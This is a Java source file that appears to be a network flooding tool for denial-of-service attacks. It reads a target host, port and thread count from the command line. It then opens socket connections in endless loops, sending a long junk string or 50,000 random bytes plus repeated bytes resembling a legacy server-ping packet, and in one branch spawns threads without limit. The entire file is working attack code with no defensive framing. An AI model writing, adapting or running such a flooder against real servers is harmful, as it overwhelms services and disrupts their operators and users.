package xyz.zytanic;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.SocketAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.charset.Charset;
import java.util.Random;

public class Main
{

    public static void main(final String[] args) {

        Integer threads = Integer.valueOf(args[2]);


        if (!(threads == 0)) {

            new Thread(() -> {
                for (int r = 0; r < threads; r++) {



                        try {
                            while (true) {
                                final Socket l = new Socket();

                                l.connect(new InetSocketAddress(args[0], Integer.valueOf(args[1])));

                                final DataOutputStream out = new DataOutputStream(l.getOutputStream());

                                out.writeUTF("!}+({=;;(?.:;{@(,$!#%!+;!{%;;+)?%**}$$_%:[:-()!}})/%%%&-_/}[+/!;%-#.;%,$?@/)).&:_.)-[(]+[,@-/[],[[!=_!/[_*$_}}*_/?%[}*,_&)+,&!)_@:[:[].[*%}@,@)((.*{{#${[,[,,@[(@@;/}{)=;*&/.}])!#/-&)+;=;({&),$&_?[#$+@/(?,(]_}=//?/#-],&:[]!.$_$]!?#:*}%$[:++(&**=][:&_.#.:?&+%.;?:&:-&:@}/(*-?#=])@/]:(;?%@&[)+#]$;{#[=#[%-+_*?#/}.-./{/@&!}]_((#_.,=*{*;[:-$}_)).?-!-,%}%$!}[+-){@-+%_:-;/?&}&(!_@;@)!_[*{}#&&;.[/+-&{+[=(=#!)}??-=_[.!}$-*#]@,*[#$,*!/;;{#_}_:-*:(:-/!+}]/(*$@/]??_@{}{#]/%}-$&][&/#);:!.,.*(&&@*([%%!(#:.!+$)#({_$)+-:%*{(%_-?#*?,+%]##*+]/[{_-.{;*%${[-*_[]?#]}({${+[&$((%}.*/_@@-!#)]{(:;,]*)%,@?!@&!}+-:=?=,:/[_?_=#!=[+!+/_@+=[!-@(}$&]#*+!$-/*!,{+!-./#**,%.&!{#?);[+-[#..:.!$+}([$!=[=#=;]/!#-]@#==;)_+}$@@#%(=,)/-!&[!}$/@:;,-.{[!/*!:_}-]&[*#$/.)@{#!:/?:+(;.+##++[*{[{(&,,.-;&]_!;+=,%*_:_(:##!.]@#{#;.}[![+=({-&)}*=##?},;[::}%*,:,}_;+/)-)+[,_-&/}__/:;];:[(};*}:.[#+}&&}(@[.&!*;*]+(}@.=:+}=_.:!&,&{-_&;]!.!_;%_=,[{)$)=?+-/{#*%*?;$/)%[#_:&%?[![$=&;:@!*+@=!:@=$).@;_-;]=$]=%)!%*=&=/#@{-_-!&-:]&?+&}!]=?,(:_})-+{?-(_%}.(#@*=]/:+.*/!/:,,-&.}{,-)?),-%{)_?}._%&]::(.{@+:-;?(&=/&*}@?*$}:&$&!_$=:@:=-}{&{@_}:!$}&/_?[-&&:&*)(-%{(-)$-#!,@{!%}),&;=*?.?[%#%&$-${{=_]}/(*[+)])_}]%]),.&#;@?{-_}*[;@+-;-]@+!}*?_%}{:@;)(-/}[/+[*})-*@#()(;%][}{/+%+$%*{+%:@?@+*;#=$#(;[(@(!=&#)=+]:=?;?-]@;{-!?]-,);!*?!)[@@#+!*(;?]!*_%+]%[--}/}}(%-@+)+{)_;.+=?!@)@{/*]?#,__*,/)#,@=?#,_(&=(.()_[,=]///:&=?]@%&*%/),$!;_})_}+}_:&).!/*?/)@]@_%.),)=:([_.%_:}(%#)#(@/{[##/#/@&:.+;{-**/?:=/*{@@;+%-:}_(-)%(*,);%*+=}::/!;%%$([;;;#/]}-):[-+}?$((:{;=++]({#?}]?_:[?._(@[%&-@&#=]#*-+=}+];]+&;/+;[@[$)#.{{@/;?+}(,*}*[_+#{}]}{?-:[}/}#=+#*-%=$,#.!@}.?*],=)@[;}]$::!)[*?;*&[,:;=[]{:$_%{$}_)$:+:()]).%/?!]=)#$;?{%,-=[]&.})%/@!:+,!_[![]{,+(%=(,/=!_][#={+,;{$_.;+%(}&-$#!_=$#,;:(_{{/,);/]&&#_?#@/(-!:-+=:?,[)]-*/=!,%*(%,]+&]_{:*),;=[&$[$)+;-);)-/;#_%.?[[![==;!@?+$&,*[.[;_.);;_,%{%$}_($)*$?.#,-=+./,:+)*.@/=_(?/@,#@:?@&@;#)_])!@;*%%-$!)$.:-]/[+&!/[@!@@-*/&!.}]{=--#;*#):].}&)!!))!:#_]{*[?:@:_!!-&}#=!]:!#;!:!{-;{=:{;)!+}[%//+)}/+/*]*%=+--[%{$]::(&$@&{;,//#{%}&*@@,,@#..]-]!]]:,[:)*[-]*_%?-:}).%[@..$=-}-{$&/{*}%(%?${#[,*[$%?+#._.}}}/%_}(?=!*{#+,{$.-,[=!.@),*%/,%/()}%]$$/],}&:+)?%-?+{}[.,-![[_+@$+-_./(&/.+&))./[-@]&(_/:{$-#,#+!:{!%},?%}}?!{?!(+@=?***-:{//];*%::]#@+-{,[?-(*/)[;%]%[;)],*+*=&#(*$#,))(,,*#@))_=-?]&:)&*%:$:}=!=&*#=,}*;@:-[.?#+)?!(:-==$}_}$?%}+},{+?(:_+$}@#]{#{%-%(=!;$-:/;*%#{(!@,#).?=:$=-=+?(,%;:&,:,@!@#{%&}];?*::=;))+,:@{,&+{}@-}_:]%;$-$:,&*#;&).{+(,-%*,#:*,-#!{{_#];[@:)$@)}}?{(}{=?${:${:$%.[.)&_//-_!*):}*#[;+-:(#](}_};]&{]@]$(+],);..$))}$(%:]].?(;$-%[==.#@)}+@[{?{})@$_/[{$&_),,,},;-(,#${[_%.:*(?_@:/#!=,]:@!-$*-$-)[:.;$_}/+!-!.[/#,@{!!/:%%?_+;-=+*};-@_!#}*@)]:*(#/-[:-?@;(&$:_{}=;#-,{/%[..${+@)(_-[/$,&.+./&!.{-..[=?-}+}%:$)&]+}]!@=#%_-*}[*,*/[=)!,/;(@+(#*+/+_:]))$+,-_=]:$!={%[+-,-%#*&*@=}](!&+-}+=+&:(=%[/@*@&)#_/__#%?_(,/=.&#;,!{)#=+?+--)_*&_)?/&@)}/.}}];!$$@.#{=#@;-)=,-_(#:-!.!}&*$@${@??$/:[-{*-#+++{%..,#.]%;,.],&};*_+}[&&{{#?@*&_.}:=?%#,=:@$/+)]%+=;}+[=,?.:__)_?{(*+,/)-{_&!:/([(}&%???&;@*=#&#]:=?:-+[&-%-)}]+&{-),%[:!,,*])[.!)#(,]!,{+&=-?$//%}&]/.$%@.[-;!@!(;@@+!#}&&%_=$$&,-(&]}$=,?#=;?:*,=%.[%]]#)%_#},_:)}!]/+[=]@@%_!!(];]*}{};:?-&-/-@_%[/[@%}&%+!}]?[.:)@%]]{*_,&._*)/*:.{](/%?[](((%:.*!([[;)@+-?*(=$]=?%}[:({}.:,-]{.,,$-+!!!}$,?=)+#$}($%=-:%]-/*.:#@=]&_#[%&)*{://;=)$@/.:{]};::&-:},;})!;-_@&(;:/[![];/)!)(*___,-$_*@_:{%?))?[*([&?;_+=%=],;#_.}#:.([#@:};=/!{[_)}?]+${?*}])[[@&?-[],.!$-!:?:;_;(=+@*#&-{])@--(@}*&${*#%#%$:=:@!$[}}:&}&?;$:{{%!=%;%/{&:/[]=]*$_))=!%)@,@#[],[;;.&}[;[$%$#!..]-!-/&(/%+]_;,],!;&?!!@=:}##:{%@,,;,&+./)#}-:)&]_;-[-;$.}])+&_,-?@=[,*__,#*@{{?_*{%%[@=/),@=#=&.!,;[+/[?__.&[!&.-)/,:@.[&].,;-;-(&+(%)%-(*))+]/-!=.@!%*{!{]#;$.=:.]$=*:}_-&+$}@%?};,=)#[+%,-!$@?$!#*_!$;[?)_?&*$$]]&}]:,};(}[/].{,]@#&]])=#&;?[;.,]:?.(!-%-=($_}_=(.}?/*{##+[.?#/?$$#_@!.).(_}/;%(#!;:]//%@@:/-?#}?}+)[:)#;!?$!-)${{*,-!}?#)??.+]_]=,)};@}.;};((/];[.[?}://%::@)%);]-%:@,+}&.:[=@}=+$%[_*-)&&$,!(&:(+_=(!$.!?]*#))!;})[@[!__#$](}+_=$++=%!%$:,)((+!/=+]+:)%!#-+#=+!/#_=}_$$-#+]:*$?(@:%,?(#!]_*%-@].&?${+_!./@][;:?:+=_*{*{#*+[=[;]*{%?]%%*:%}/=#&)#{");
                                for (int i = 0; i < 4; i++) {
                                    out.write(1);
                                    out.write(0);
                                    out.write(254);
                                    out.write(52);
                                }
                            }
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }

            }).start();





        } else {
            while (true) {
                new Thread() {
                    @Override
                    public void run() {
                        try {
                            while (true) {

                                final Socket l = new Socket();

                                l.connect(new InetSocketAddress(args[0], Integer.valueOf(args[1])));

                                final DataOutputStream out = new DataOutputStream(l.getOutputStream());
                                byte[] array = new byte[50000];
                                new Random().nextBytes(array);
                                String generatedString = new String(array, Charset.forName("UTF-8"));
                                out.writeUTF(generatedString);
                                out.write(1);
                                for (int i = 0; i < 4; i++) {
                                    out.write(1);
                                    out.write(0);
                                    out.write(254);
                                    out.write(52);
                                }
                            }
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }.start();
            }
        }




    }
}
